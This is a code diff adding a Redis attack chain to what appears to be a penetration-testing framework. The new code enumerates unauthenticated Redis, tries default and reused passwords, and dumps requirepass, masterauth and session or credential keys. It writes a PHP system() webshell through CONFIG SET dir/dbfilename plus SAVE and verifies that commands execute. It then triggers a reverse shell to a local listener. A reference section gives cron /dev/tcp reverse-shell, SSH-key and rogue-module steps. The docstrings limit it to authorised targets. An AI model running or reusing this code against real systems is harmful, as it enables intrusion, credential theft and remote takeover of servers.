@@ -2480,6 +2480,57 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"MySQL: {mv.group(1).strip()}"[:140]}
         return None
 
+    # 2be6) redis-shell: reverse shell fired through the CONFIG-SET webshell
+    if sid == "redis-shell":
+        if "shell → " in output:
+            mm = re.search(r"shell → (.+)$", output, re.M)
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"Redis foothold — {mm.group(1).strip()}"[:140]}
+        return None
+
+    # 2be5) redis-rce: CONFIG SET dir/dbfilename webshell → confirmed command execution
+    if sid == "redis-rce":
+        mu = re.search(r"^✗ RCE (\S+)", output, re.M)
+        if mu:
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"Redis RCE: webshell {mu.group(1)}"[:140]}
+        return None
+
+    # 2be4) redis-loot: leaked requirepass/masterauth or dumped key values
+    if sid == "redis-loot":
+        secrets = re.findall(r"^✗ SECRET (.+)$", output, re.M)
+        keys = re.findall(r"^✗ KEY ", output, re.M)
+        if secrets:
+            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                    "summary": f"Redis secret: {'; '.join(s.strip() for s in secrets[:2])}"[:140]}
+        if keys:
+            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
+                    "summary": f"Redis: {len(keys)} key value(s) dumped (creds/sessions)"[:140]}
+        return None
+
+    # 2be3) redis-auth: a default/reused password (or unauth) unlocked Redis
+    if sid == "redis-auth":
+        if re.search(r"^✗ UNAUTH", output, re.M):
+            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
+                    "summary": "Redis: no authentication required (remote read/write)"[:140]}
+        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
+        if not hits:
+            return None
+        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                "summary": f"Redis auth: {'; '.join(h.strip() for h in hits[:3])}"[:140]}
+
+    # 2be2) redis-info: unauthenticated Redis (exposed) → else version disclosure (info)
+    if sid == "redis-probe":
+        if re.search(r"^✗ UNAUTH", output, re.M):
+            mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
+            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
+                    "summary": f"Redis unauthenticated: {(mv.group(1).strip() if mv else 'remote read/write')}"[:140]}
+        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
+        if mv:
+            return {"state": "INFO", "cve": cve, "risk": "LOW",
+                    "summary": f"Redis: {mv.group(1).strip()}"[:140]}
+        return None
+
     # 2bf3) krb-spray: Kerberos pre-auth spray validated a domain cred
     if sid == "krb-spray":
         hits = re.findall(r"^✗ CREDS (.+?)  \(Kerberos", output, re.M)
@@ -3539,13 +3590,11 @@ _EXPLOIT_STEPS = {
         "Manual steps & further research",
     ],
     "redis": [
-        "Connect unauthenticated; note version, and INFO / CONFIG GET dir,dbfilename",
-        "If auth required, try default / no password, then known creds (AUTH)",
-        "Read keys for creds/sessions (KEYS *, GET)",
-        "Writable dir → write an SSH key (CONFIG SET dir ~/.ssh, dbfilename authorized_keys)",
-        "Writable web root → write a webshell via CONFIG SET dir + SAVE",
-        "RCE via malicious module (MODULE LOAD) or master/slave replication (redis-rogue-server)",
-        "Manual steps & further research",
+        ("INFO + CONFIG (stdlib RESP) → version/role, dir/dbfilename, unauth flag", "redis-probe"),
+        ("If AUTH required: default + reused passwords (targeted); else unauth", "redis-auth"),
+        ("Loot: requirepass/masterauth, KEYS * → creds/sessions (type-aware, read-only)", "redis-loot"),
+        ("RCE: CONFIG SET dir/dbfilename webshell → exec-verified; SSH-key/cron guidance", "redis-rce"),
+        ("Manual steps & further research", "redis-next"),
     ],
     "memcached": [
         "stats / stats items / stats slabs / stats cachedump (unauthenticated)",
@@ -15815,6 +15864,481 @@ def _tool_krb_next(ip: str, port: int, proto: str) -> str:
     return "\n".join(L)
 
 
+# ══ Redis (6379 / 6380) ══ RESP is a trivial text protocol, so this is pure stdlib. An unauthenticated
+# (or weakly-authenticated) Redis is a fast path to RCE — CONFIG SET dir/dbfilename + SAVE writes an
+# attacker-controlled file anywhere the redis user can write (webshell / SSH key / cron). Read/loot and
+# the webshell RCE are automated + exec-verified; SSH-key / module / replication stay in the reference.
+_REDIS_INFO_DEADLINE = 40
+_REDIS_LOOT_DEADLINE = 60
+_REDIS_DEFAULTS = ["foobared", "redis", "password", "admin", "root", "P@ssw0rd", "123456", "redis123"]
+_REDIS_WEBROOTS = ["/var/www/html", "/var/www", "/usr/share/nginx/html", "/srv/http",
+                   "/var/www/htdocs", "/app/public"]
+
+
+def _resp_enc(args: list) -> bytes:
+    """Encode a Redis command as a RESP array of bulk strings."""
+    out = b"*%d\r\n" % len(args)
+    for a in args:
+        b = a.encode("latin-1") if isinstance(a, str) else a
+        out += b"$%d\r\n%s\r\n" % (len(b), b)
+    return out
+
+
+def _resp_read(f):
+    """Parse one RESP reply from a buffered socket file → str / int / list / None / {'error':…}."""
+    line = f.readline()
+    if not line:
+        return {"error": "eof"}
+    t, rest = line[:1], line[1:].rstrip(b"\r\n")
+    if t == b"+":
+        return rest.decode("latin-1", "replace")
+    if t == b"-":
+        return {"error": rest.decode("latin-1", "replace")}
+    if t == b":":
+        try:
+            return int(rest)
+        except ValueError:
+            return 0
+    if t == b"$":
+        try:
+            n = int(rest)
+        except ValueError:
+            return {"error": "badbulk"}
+        if n < 0:
+            return None
+        data = f.read(n)
+        f.read(2)                                            # trailing CRLF
+        return data.decode("latin-1", "replace")
+    if t == b"*":
+        try:
+            n = int(rest)
+        except ValueError:
+            return {"error": "badarray"}
+        if n < 0:
+            return None
+        return [_resp_read(f) for _ in range(n)]
+    return rest.decode("latin-1", "replace")
+
+
+def _redis_multi(ip: str, port: int, cmds: list, auth: "str | None" = None, timeout: float = 6.0) -> list:
+    """Run a list of Redis commands on one connection (AUTH first when auth is given). Returns a list of
+    replies. Raises RuntimeError on a connection failure."""
+    import socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(timeout)
+    try:
+        try:
+            s.connect((ip, port))
+        except OSError as exc:
+            raise RuntimeError(f"no Redis on {ip}:{port} ({exc})")
+        f = s.makefile("rb")
+        replies = []
+        try:
+            if auth is not None:
+                s.sendall(_resp_enc(["AUTH", auth]))
+                _resp_read(f)                                # consume the AUTH reply
+            for c in cmds:
+                s.sendall(_resp_enc([str(x) for x in c]))
+                replies.append(_resp_read(f))
+        except OSError as exc:
+            replies.append({"error": f"io: {exc}"})
+        finally:
+            f.close()
+        return replies
+    finally:
+        try:
+            s.close()
+        except Exception:                                    # noqa: BLE001
+            pass
+
+
+def _redis_cmd(ip: str, port: int, args: list, auth: "str | None" = None, timeout: float = 6.0):
+    """Run a single Redis command → its reply (str / int / list / None / {'error':…})."""
+    return _redis_multi(ip, port, [args], auth, timeout)[0]
+
+
+def _gather_redis_auth(ip: str) -> list:
+    """Redis passwords redis-auth proved for this host ('redis on <ip>')."""
+    out = []
+    for sid, output in fetch_scripts(ip, 445, "tcp"):
+        if sid != "smb-creds":
+            continue
+        for m in re.finditer(rf"! \S+?:(\S*) @ redis on {re.escape(ip)}\b", output or ""):
+            out.append("" if m.group(1) == "<blank>" else m.group(1))
+    return out
+
+
+def _redis_working_auth(ip: str, port: int) -> tuple:
+    """(ok, auth) — how to talk to this Redis: (True, None) unauth, (True, pw) with a stored password,
+    (False, None) when auth is required and none is known / protected mode blocks us."""
+    r = _redis_cmd(ip, port, ["PING"])
+    if r == "PONG":
+        return (True, None)
+    if isinstance(r, dict) and "NOAUTH" in r.get("error", ""):
+        for pw in _gather_redis_auth(ip):
+            if _redis_cmd(ip, port, ["PING"], auth=pw) == "PONG":
+                return (True, pw)
+    return (False, None)
+
+
+def _tool_redis_info(ip: str, port: int, proto: str) -> str:
+    """Redis step 1 tool: connect unauthenticated (stdlib RESP) and read INFO — version, role, mode,
+    OS — plus CONFIG GET dir/dbfilename (the write target for RCE). Flags a fully unauthenticated Redis
+    (critical: remote read/write) vs one that wants AUTH vs protected-mode. Records the service and
+    runs searchsploit. Read-only. A host that doesn't speak RESP raises. Authorised targets only."""
+    ping = _redis_cmd(ip, port, ["PING"])
+    noauth = isinstance(ping, dict) and "NOAUTH" in ping.get("error", "")
+    protected = isinstance(ping, dict) and "protected mode" in str(ping.get("error", "")).lower()
+    auth = None
+    if noauth:
+        for pw in _gather_redis_auth(ip):
+            if _redis_cmd(ip, port, ["PING"], auth=pw) == "PONG":
+                auth = pw
+                break
+
+    lines = []
+    info = _redis_cmd(ip, port, ["INFO"], auth=auth)
+    if isinstance(info, str) and "redis_version" in info:
+        def g(pat):
+            mm = re.search(pat, info)
+            return mm.group(1).strip() if mm else ""
+        version, role, mode, os_ = g(r"redis_version:(\S+)"), g(r"role:(\S+)"), g(r"redis_mode:(\S+)"), g(r"os:(.+)")
+        save_services(ip, [{"port": port, "proto": proto, "name": "redis",
+                            "product": "Redis", "version": version}])
+        if auth is None and not noauth:
+            lines.append("✗ UNAUTH — Redis answers with no authentication (full remote read/write)")
+        lines.append(f"[*] Service: Redis {version}"
+                     + (f" · role {role}" if role else "") + (f" · {mode}" if mode else "")
+                     + (f" · {os_[:40]}" if os_ else ""))
+        cfg = _redis_multi(ip, port, [["CONFIG", "GET", "dir"], ["CONFIG", "GET", "dbfilename"],
+                                      ["CONFIG", "GET", "requirepass"]], auth=auth)
+        d = cfg[0][1] if isinstance(cfg[0], list) and len(cfg[0]) > 1 else ""
+        dbf = cfg[1][1] if isinstance(cfg[1], list) and len(cfg[1]) > 1 else ""
+        rp = cfg[2][1] if isinstance(cfg[2], list) and len(cfg[2]) > 1 else ""
+        if d:
+            lines.append(f"· dir={d}  dbfilename={dbf}  {DIM}(write target for RCE — redis-rce r4){RESET}")
+        if rp:
+            lines.append(f"✗ requirepass leaked: {rp}  (reuse as an OS/service password)")
+        if shutil.which("searchsploit") and version:
+            proc = subprocess.run(["searchsploit", "-j", "-s", "-t", "Redis", version],
+                                  capture_output=True, text=True, timeout=30)
+            try:
+                rows = json.loads(proc.stdout or "{}").get("RESULTS_EXPLOIT", [])
+            except ValueError:
+                rows = []
+            seen = set()
+            for r in rows[:20]:
+                edb = str(r.get("EDB-ID", "?"))
+                if edb in seen:
+                    continue
+                seen.add(edb)
+                lines.append(f"[searchsploit] {(r.get('Title') or '').strip()}  (EDB-{edb})")
+                if len(seen) >= 6:
+                    break
+    elif noauth:
+        lines.append("· NOAUTH — authentication required; try redis-auth (r2)")
+    elif protected:
+        lines.append("· protected-mode ON and bound remotely → commands refused; needs a bind bypass "
+                     "(SSRF/gopher) or local access")
+    else:
+        lines.append(f"· unexpected reply to PING: {ping}")
+    return f"Redis INFO — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+def _tool_redis_auth(ip: str, port: int, proto: str) -> str:
+    """Redis step 2 tool: if the instance needs AUTH, try a curated set of default Redis passwords plus
+    any harvested password (reuse) — targeted, not a wordlist. When no auth is required, says so (loot /
+    RCE work directly). Valid passwords are saved ('redis on <host>'). Authorised targets only."""
+    if _redis_cmd(ip, port, ["PING"]) == "PONG":
+        return (f"Redis auth — {ip}:{port}\n\n"
+                "✗ UNAUTH — no authentication required (loot r3 / RCE r4 work directly)")
+    reused = [s for _d, _u, s in _gather_all_smb_creds()
+              if s and not re.fullmatch(r"[a-fA-F0-9]{32}", s)]
+    cands, seen = [], set()
+    for pw in _REDIS_DEFAULTS + reused:
+        if pw and pw not in seen:
+            seen.add(pw)
+            cands.append(pw)
+
+    valid = []
+    for pw in cands:
+        r = _redis_cmd(ip, port, ["PING"], auth=pw)
+        if r == "PONG":
+            valid.append(pw)
+            break
+        if isinstance(r, dict) and "NOAUTH" not in r.get("error", "") and "WRONGPASS" not in r.get("error", "") \
+                and "invalid password" not in r.get("error", "").lower():
+            break                                            # not a NOAUTH target after all
+
+    if valid:
+        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
+        for pw in valid:
+            line = f"! default:{pw or '<blank>'} @ redis on {ip} [{ip}]"
+            blocks.setdefault(ip, [])
+            if line not in blocks[ip]:
+                blocks[ip].append(line)
+        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)
+
+    lines = [f"[*] {len(cands)} password(s) tried (defaults + reuse) · {len(valid)} valid"]
+    for pw in valid:
+        lines.append(f"✗ CREDS default:{pw}  (AUTH)")
+    lines.append("· loot it (r3) then RCE (r4)" if valid
+                 else "· no default/reused password worked — crack requirepass from a config leak, or reuse app creds")
+    return f"Redis auth — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+def _tool_redis_loot(ip: str, port: int, proto: str) -> str:
+    """Redis step 3 tool: with access (unauth or a proven password), leak requirepass/masterauth, count
+    keys and dump the values of interesting keys (creds/sessions/tokens — type-aware GET/HGETALL/LRANGE/
+    SMEMBERS). Read-only. No access → raises. Authorised targets only."""
+    ok, auth = _redis_working_auth(ip, port)
+    if not ok:
+        raise RuntimeError("no Redis access — run redis-auth (r2) first (or it's protected-mode)")
+    head = _redis_multi(ip, port, [["CONFIG", "GET", "requirepass"], ["CONFIG", "GET", "masterauth"],
+                                   ["DBSIZE"], ["KEYS", "*"]], auth=auth, timeout=20)
+    rp = head[0][1] if isinstance(head[0], list) and len(head[0]) > 1 else ""
+    ma = head[1][1] if isinstance(head[1], list) and len(head[1]) > 1 else ""
+    dbsize = head[2] if isinstance(head[2], int) else "?"
+    keys = [k for k in head[3] if isinstance(k, str)] if isinstance(head[3], list) else []
+
+    juicy = re.compile(r"pass|pwd|secret|token|session|user|cred|key|auth|flag", re.I)
+    picked = [k for k in keys if juicy.search(k)] or keys
+    picked = picked[:25]
+    types = _redis_multi(ip, port, [["TYPE", k] for k in picked], auth=auth, timeout=20)
+    reads = []
+    for k, t in zip(picked, types):
+        if t == "string":
+            reads.append((k, ["GET", k]))
+        elif t == "hash":
+            reads.append((k, ["HGETALL", k]))
+        elif t == "list":
+            reads.append((k, ["LRANGE", k, 0, 20]))
+        elif t == "set":
+            reads.append((k, ["SMEMBERS", k]))
+        elif t == "zset":
+            reads.append((k, ["ZRANGE", k, 0, 20]))
+    vals = _redis_multi(ip, port, [c for _k, c in reads], auth=auth, timeout=30)
+
+    lines = [f"[*] {dbsize} key(s) · {len(keys)} enumerated · {len(reads)} sampled"]
+    if rp:
+        lines.append(f"✗ SECRET requirepass={rp}")
+    if ma:
+        lines.append(f"✗ SECRET masterauth={ma}")
+    for (k, _c), v in zip(reads, vals):
+        if isinstance(v, list):
+            v = " ".join(str(x) for x in v if x is not None)
+        v = str(v).replace("\n", " ").strip()
+        if v and not v.startswith("{'error'"):
+            lines.append(f"✗ KEY {k} = {v[:90]}")
+    for k in keys[:20]:
+        if not any(k == kk for kk, _c in reads):
+            lines.append(f"· key {k}")
+    if not rp and not ma and not reads:
+        lines.append("· empty / no interesting keys — still a write primitive for RCE (redis-rce r4)")
+    return f"Redis loot — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+def _tool_redis_rce(ip: str, port: int, proto: str) -> str:
+    """Redis step 4 tool: turn the CONFIG SET dir/dbfilename + SAVE write primitive into a PHP webshell
+    in a served web root and exec-verify it over HTTP with a computed marker (real command execution).
+    Restores the original dir/dbfilename config afterwards; the dumped RDB file stays on disk (reported
+    for manual cleanup). SSH-key / module / replication RCE stay in redis-next. Needs access + a
+    writable+served web root. Authorised targets only."""
+    import os as _os
+    import urllib.parse
+    ok, auth = _redis_working_auth(ip, port)
+    if not ok:
+        raise RuntimeError("no Redis access — run redis-auth (r2) first")
+
+    orig = _redis_multi(ip, port, [["CONFIG", "GET", "dir"], ["CONFIG", "GET", "dbfilename"]], auth=auth)
+    odir = orig[0][1] if isinstance(orig[0], list) and len(orig[0]) > 1 else ""
+    odbf = orig[1][1] if isinstance(orig[1], list) and len(orig[1]) > 1 else "dump.rdb"
+
+    http_ports = [p for p, pr, _s in fetch_ports(ip) if p in _MYSQL_HTTP_PORTS and pr == "tcp"] or [80]
+    payload = "\n\n<?php system($_GET['c']); ?>\n\n"
+    rce, written, deadline = [], [], time.time() + 90
+    for wr in _REDIS_WEBROOTS:
+        if rce or time.time() > deadline:
+            break
+        name = f"pshm_{_os.urandom(3).hex()}.php"
+        seq = _redis_multi(ip, port, [["CONFIG", "SET", "dir", wr], ["CONFIG", "SET", "dbfilename", name],
+                                      ["SET", "pshm", payload], ["SAVE"]], auth=auth, timeout=20)
+        if not (seq[0] == "OK" and seq[3] == "OK"):          # dir not writable / SAVE failed
+            continue
+        written.append(f"{wr}/{name}")
+        for hp in http_ports:
+            tls = hp in (443, 8443)
+            mark = f"PSH{_os.urandom(2).hex()}"
+            probe = urllib.parse.quote(f"echo {mark}$((6*7))")
+            body = _http_get(ip, hp, f"/{name}?c={probe}", tls)
+            if body and f"{mark}42" in body:
+                rce.append((f"{'https' if tls else 'http'}://{ip}:{hp}/{name}", f"{wr}/{name}"))
+                break
+    _redis_multi(ip, port, [["DEL", "pshm"], ["CONFIG", "SET", "dir", odir or "/tmp"],
+                            ["CONFIG", "SET", "dbfilename", odbf or "dump.rdb"]], auth=auth)
+
+    lines = [f"[*] write primitive via CONFIG SET dir/dbfilename + SAVE"]
+    for url, _path in rce:
+        lines.append(f"✗ RCE {url} (php system())")
+    for path in written:
+        if not any(path == pp for _u, pp in rce):
+            lines.append(f"⚠ wrote RDB but not served: {path} — rm it manually (redis can't delete files)")
+    for _u, path in rce:
+        lines.append(f"⚠ webshell RDB left on disk: {path} — rm it manually")
+    if rce:
+        lines.append("· spawn a reverse shell: Privilege Escalation phase → spawn-shell (r1)")
+    else:
+        lines.append("· no writable+served web root hit — try SSH-key / cron / module RCE (redis-next r5)")
+    return f"Redis RCE — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+def _tool_redis_shell(ip: str, port: int, proto: str) -> str:
+    """Redis foothold (INTERACTIVE): fire a reverse shell through the webshell redis-rce confirmed —
+    smart auto-upgrading listener on a free local port, then trigger over HTTP (with retries). Headless
+    prints the curl. Authorised targets only."""
+    import urllib.parse
+    rout = next((o for s, o in fetch_scripts(ip, port, proto) if s == "redis-rce"), "")
+    mu = re.search(r"^✗ RCE (\S+)", rout, re.M)
+    if not mu:
+        print(f"\n{YELLOW}no confirmed Redis webshell{RESET} — run {BOLD}redis-rce (r4){RESET} first.")
+        return "redis-shell: no confirmed webshell (run redis-rce r4)"
+    url = mu.group(1)
+    mm = re.match(r"(https?)://([^:/]+):?(\d+)?(/.*)$", url)
+    if not mm:
+        return "redis-shell: could not parse the webshell URL"
+    scheme, _host, hp, path = mm.group(1), mm.group(2), mm.group(3), mm.group(4)
+    tls = scheme == "https"
+    web_port = int(hp) if hp else (443 if tls else 80)
+    lhost = _foothold_lhost(ip)
+    if not lhost:
+        print(f"{RED}✗ could not determine our IP toward {ip}{RESET}")
+        return "redis-shell: no LHOST"
+    lport = _free_local_port(4444)
+    if lport != 4444:
+        print(f"{YELLOW}port 4444 in use{RESET}{DIM} — using {BOLD}{lport}{RESET}{DIM} for the listener{RESET}")
+    _rlabel, _n, rtpl, rpty = _REVSHELLS[0]
+    revsh = rtpl.replace("{ip}", lhost).replace("{port}", str(lport))
+    path_q = f"{path}?c={urllib.parse.quote(revsh)}"
+    upgrade = b"" if rpty else _FOOTHOLD_UPGRADE.encode()
+    src = _SMART_LISTENER_SRC.replace("__LPORT__", str(lport)).replace("__UPGRADE__", repr(upgrade))
+    fd, spath = tempfile.mkstemp(prefix="pshunter_listener_", suffix=".py")
+    with os.fdopen(fd, "w") as fh:
+        fh.write(src)
+    used = _open_listener_terminal(spath)
+
+    def _fire():
+        try:
+            _http_get(ip, web_port, path_q, tls)
+        except Exception:                                    # noqa: BLE001
+            pass
+
+    if not used:
+        _safe_unlink(spath)
+        print(f"{YELLOW}headless{RESET} — start {BOLD}nc -lvnp {lport}{RESET}, then fire:\n  "
+              f"{BOLD}curl '{url}?c=<url-encoded reverse shell>'{RESET}")
+        return f"redis-shell: headless — webshell {url}"
+    print(f"{GREEN}▶ smart listener opened{RESET} {DIM}({used}) on {lhost}:{lport}{RESET}")
+    time.sleep(1.5)
+    for _ in range(3):
+        _fire()
+        time.sleep(1.0)
+    print(f"  {DIM}→ check the new terminal for your {GREEN}shell{RESET}{DIM}; re-fire the curl if nothing landed{RESET}")
+    return f"redis-shell: web-rce shell → {lhost}:{lport} (via {url})"
+
+
+# ── Redis step 5: manual steps & further research (reference only, context-aware) ─
+def _tool_redis_next(ip: str, port: int, proto: str) -> str:
+    """Redis step-5 tool: NOT a scan — a read-only checklist of Redis RCE & pivot paths (SSH key, cron,
+    module load, replication), with this host's findings substituted in (writable dir, confirmed RCE,
+    leaked secrets, keys, CVEs, unconfirmed ⚠). Pure DB synthesis; no network."""
+    scripts = fetch_scripts(ip, port, proto)
+    by_sid = {}
+    for sid, out in scripts:
+        by_sid.setdefault(sid, out or "")
+    info, loot, rce = by_sid.get("redis-probe", ""), by_sid.get("redis-loot", ""), by_sid.get("redis-rce", "")
+
+    mv = re.search(r"^\[\*\] Service:\s*(.+)$", info, re.M)
+    ver = mv.group(1).split("·")[0].strip() if mv else ""
+    md = re.search(r"dir=(\S+)", info)
+    wdir = md.group(1) if md else "/var/lib/redis"
+    unauth = "✗ UNAUTH" in info
+    has_rce = "✗ RCE " in rce
+    secrets = re.findall(r"^✗ SECRET (.+)$", loot, re.M) + re.findall(r"^✗ requirepass leaked: (.+)$", info, re.M)
+    keys = re.findall(r"^✗ KEY (.+)$", loot, re.M)
+
+    oports = {(p, pr) for p, pr, _s in fetch_ports(ip)}
+    ssh_open = (22, "tcp") in oports
+
+    kev = _load_kev()
+    found = set()
+    for (p, pr, _sc, _st, cv, _rk, _sm) in fetch_vulns(ip):
+        if p == port and pr == proto and cv:
+            found |= {c.strip() for c in cv.split(",") if c.strip()}
+    for _sid, out in scripts:
+        found |= set(re.findall(r"CVE-\d{4}-\d{3,7}", out or ""))
+    found = sorted(found, key=_cve_sort_key)
+
+    warns = []
+    for sid, out in scripts:
+        for ln in (out or "").splitlines():
+            if ln.strip().startswith("⚠"):
+                warns.append(f"{DIM}[{sid}]{RESET} {ln.strip()}")
+    warns = warns[:14]
+
+    sub = (f"{DIM}version: {ver or 'unknown'}  ·  unauth: {'yes' if unauth else 'no'}  ·  "
+           f"write dir: {wdir}  ·  RCE: {'yes' if has_rce else 'no'}")
+    L = [f"Redis {ip} — manual steps {DIM}(reference only — nothing is scanned here){RESET}", sub + RESET]
+
+    L.append(f"\n{BOLD}A. Get code exec{RESET}")
+    if has_rce:
+        L.append(f"  {CYAN}ready{RESET} {DIM}(webshell) → Privilege Escalation phase → spawn-shell (r1){RESET}")
+    else:
+        L.append(f"  {DIM}webshell not confirmed — retry redis-rce (r4) against the real web root{RESET}")
+    L.append(f"  {DIM}SSH key: CONFIG SET dir /root/.ssh (or /home/<u>/.ssh); CONFIG SET dbfilename "
+             f"authorized_keys; SET x \"\\n\\n<id_rsa.pub>\\n\\n\"; SAVE → ssh in"
+             + (f" (SSH is open on {ip}:22)" if ssh_open else "") + f"{RESET}")
+    L.append(f"  {DIM}cron: CONFIG SET dir /var/spool/cron (or /etc/cron.d); dbfilename root/crontab; "
+             f"SET x \"\\n* * * * * root bash -i >& /dev/tcp/LHOST/LPORT 0>&1\\n\"; SAVE (Debian/RH paths differ){RESET}")
+    L.append(f"  {DIM}module: MODULE LOAD /path/exp.so → system.exec 'id' (build redis-rce-module); "
+             f"replication: SLAVEOF our rogue master → redis-rogue-server pushes a module{RESET}")
+
+    L.append(f"\n{BOLD}B. Secrets & reuse{RESET}")
+    if secrets:
+        for s in secrets[:6]:
+            L.append(f"  {CYAN}secret{RESET} {DIM}{s}{RESET}")
+        L.append(f"  {DIM}reuse requirepass/masterauth as OS/service passwords (password reuse){RESET}")
+    else:
+        L.append(f"  {DIM}no requirepass/masterauth leaked — check config / loot (redis-loot r3){RESET}")
+
+    L.append(f"\n{BOLD}C. Loot recap{RESET}")
+    if keys:
+        L.append(f"  {CYAN}{len(keys)} interesting key(s){RESET} {DIM}dumped — sessions/tokens → hijack; "
+                 f"app creds → reuse{RESET}")
+    else:
+        L.append(f"  {DIM}nothing juicy dumped yet — KEYS * then GET/HGETALL (redis-loot r3){RESET}")
+
+    L.append(f"\n{BOLD}D. CVEs surfaced in this phase{RESET}")
+    if found:
+        for c in found:
+            ktag = f"  {RED}KEV{RESET}" if c in kev else ""
+            L.append(f"  {c}{ktag}  {DIM}https://nvd.nist.gov/vuln/detail/{c}{RESET}")
+    else:
+        L.append(f"  {DIM}none surfaced — CVE-2022-0543 (Debian/Ubuntu Lua sandbox escape → RCE), "
+                 f"searchsploit '{ver or 'Redis <version>'}'{RESET}")
+
+    L.append(f"\n{BOLD}E. Verify unconfirmed findings from this phase{RESET}")
+    if warns:
+        for w in warns:
+            L.append(f"  {w}")
+    else:
+        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")
+
+    L.append(f"\n{BOLD}F. Re-run & housekeeping{RESET}")
+    L.append(f"  {DIM}remove any pshm_*.php / authorized_keys / crontab RDB you wrote (redis can't delete "
+             f"files — rm on the box); restore the original dir/dbfilename so persistence still works{RESET}")
+    return "\n".join(L)
+
+
 # ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
 # service surfaced. A router: it detects which of this host's services have a viable path to a
 # shell (from findings already in the DB) and dispatches to that service's existing foothold tool
@@ -15858,6 +16382,10 @@ def _spawn_shell_paths(ip: str) -> list:
         rce = next((o for s, o in fetch_scripts(ip, p, pr) if s == "psql-rce"), "")
         if "✗ RCE " in rce:
             paths.append(("PostgreSQL", "reverse shell via COPY … FROM PROGRAM (superuser)", "psql-shell", p, pr))
+    for p, pr in by_key.get("redis", []):
+        rce = next((o for s, o in fetch_scripts(ip, p, pr) if s == "redis-rce"), "")
+        if "✗ RCE " in rce:
+            paths.append(("Redis", "reverse shell via the CONFIG SET webshell", "redis-shell", p, pr))
     for p, pr in by_key.get("mssql", []):
         if _gather_mssql_admin(ip):
             paths.append(("MSSQL", "xp_cmdshell → PowerShell reverse shell (sysadmin)", "mssql-shell", p, pr))
@@ -15987,6 +16515,12 @@ _STEP_TOOLS = {
     "krb-roast": ("AS-REP roast + Kerberoast over port 88 (impacket GetNPUsers/GetUserSPNs)", _tool_krb_roast),
     "krb-spray": ("Kerberos pre-auth password spray → domain creds (impacket-getTGT, lockout-aware)", _tool_krb_spray),
     "krb-next": ("manual Kerberos steps (context-aware, reference only)", _tool_krb_next),
+    "redis-probe": ("Redis INFO/CONFIG (stdlib RESP) → version, dir/dbfilename, unauth flag", _tool_redis_info),
+    "redis-auth": ("Redis default/reused password check (stdlib RESP AUTH, targeted)", _tool_redis_auth),
+    "redis-loot": ("Redis loot → requirepass/masterauth + KEYS * dump (read-only)", _tool_redis_loot),
+    "redis-rce": ("Redis CONFIG SET webshell → exec-verified RCE (stdlib + HTTP verify)", _tool_redis_rce),
+    "redis-shell": ("Redis foothold → reverse shell via the webshell (spawned)", _tool_redis_shell),
+    "redis-next": ("manual Redis steps (context-aware, reference only)", _tool_redis_next),
     "mssql-banner": ("MSSQL fingerprint — SQL Browser 1434 / TDS pre-login → version (stdlib)", _tool_mssql_banner),
     "mssql-creds": ("sa blank/default + reused creds (netexec mssql, flags sysadmin)", _tool_mssql_creds),
     "mssql-exec": ("xp_cmdshell command exec confirm (netexec -x, sysadmin)", _tool_mssql_exec),
@@ -16103,6 +16637,12 @@ _STEP_TOOL_RUNS = {
     "krb-roast":        ("impacket GetNPUsers/GetUserSPNs", f"{_mins(_KRB_ENUM_DEADLINE)} min"),
     "krb-spray":        ("impacket-getTGT", f"{_mins(_KRB_SPRAY_DEADLINE)} min"),
     "krb-next":         ("reference · no scan", None),
+    "redis-probe":       ("Python (RESP) + searchsploit", None),
+    "redis-auth":       ("Python (RESP AUTH)", None),
+    "redis-loot":       ("Python (RESP)", f"{_mins(_REDIS_LOOT_DEADLINE)} min"),
+    "redis-rce":        ("Python (RESP) + HTTP verify", None),
+    "redis-shell":      ("Python (smart listener)", None),
+    "redis-next":       ("reference · no scan", None),
     "mssql-banner":     ("Python (stdlib) + searchsploit", None),
     "mssql-creds":      ("netexec mssql", f"{_mins(_MSSQLCREDS_DEADLINE)} min"),
     "mssql-exec":       ("netexec mssql -x", None),
@@ -16196,7 +16736,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         return
     tlabel, runner = _STEP_TOOLS[tool_key]
 
-    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "oracle-next", "mssql-next", "ssh-next", "ldap-next", "krb-next"):  # foreground: interactive / print-now
+    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "oracle-next", "mssql-next", "ssh-next", "ldap-next", "krb-next", "redis-next"):  # foreground: interactive / print-now
         prev = fetch_step_status(ip, port, proto, key).get(n)
         set_step_status(ip, port, proto, key, n, "running")
         try:
@@ -16205,7 +16745,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
             print(f"{RED}✗ {tool_key} error: {exc}{RESET}")
             set_step_status(ip, port, proto, key, n, prev)
             return
-        if tool_key in ("next-steps", "smb-next", "winrm-next", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "oracle-next", "mssql-next", "ssh-next", "ldap-next", "krb-next"):  # a list to read now, not a scan result
